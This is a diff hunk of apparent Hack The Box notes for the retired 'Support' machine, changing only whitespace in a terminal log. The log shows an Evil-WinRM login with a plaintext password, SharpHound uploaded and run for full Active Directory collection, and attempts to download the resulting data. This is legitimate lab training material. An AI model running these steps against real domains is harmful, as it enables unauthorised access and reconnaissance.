@@ -1018,16 +1018,16 @@ cmd /c "dir C:\Users\support\Documents\*.zip"
                1 File(s)         12,353 bytes
                0 Dir(s)   3,962,662,912 bytes free
 *Evil-WinRM* PS C:\Users\support\Documents> download 20260722040820_BloodHound.zip
-                                        
+
 Info: Downloading C:\Users\support\Documents\20260722040820_BloodHound.zip to 20260722040820_BloodHound.zip
-                                        
+
 Info: Download successful!
 *Evil-WinRM* PS C:\Users\support\Documents> 
-                                        
+
 Error: An error of type NoMethodError happened, message is undefined method `empty?' for nil
-                                        
+
 Error: Exiting with code 1
-                                                                                                                                                           
+
 ┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
 └─$ ls
 20260722040820_BloodHound.zip                              Microsoft.Extensions.Logging.Abstractions.dll  System.Threading.Tasks.Extensions.dll
@@ -1036,22 +1036,22 @@ decrypt.py                                                 System.Buffers.dll   
 Microsoft.Bcl.AsyncInterfaces.dll                          System.Memory.dll                              UserInfo.exe.config
 Microsoft.Extensions.DependencyInjection.Abstractions.dll  System.Numerics.Vectors.dll                    UserInfo.exe.zip
 Microsoft.Extensions.DependencyInjection.dll               System.Runtime.CompilerServices.Unsafe.dll
-                                                                                                                                                           
+
 ┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
 └─$ evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
-                                        
+
 Evil-WinRM shell v3.9
-                                        
+
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
+
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
+
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\support\Documents> cd C:\Windows\Temp
 *Evil-WinRM* PS C:\Windows\Temp> upload SharpHound.exe
-                                        
+
 Info: Uploading /home/kali/nedmoeca/HTB/Machines/Retired/Support/SharpHound.exe to C:\Windows\Temp\SharpHound.exe
-                                        
+
 Info: Upload successful!
 *Evil-WinRM* PS C:\Windows\Temp> C:\Windows\Temp\SharpHound.exe -c All --outputdirectory C:\Users\support\Documents
 2026-07-22T04:24:24.6989381-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
@@ -1089,9 +1089,9 @@ Closing writers
                2 File(s)         24,705 bytes
                0 Dir(s)   3,961,569,280 bytes free
 *Evil-WinRM* PS C:\Windows\Temp> download 20260722042510_BloodHound.zip
-                                        
+
 Info: Downloading C:\Windows\Temp\20260722042510_BloodHound.zip to 20260722042510_BloodHound.zip
-                                        
+
 Error: Download failed. Check filenames or paths
 *Evil-WinRM* PS C:\Windows\Temp> 
 ```
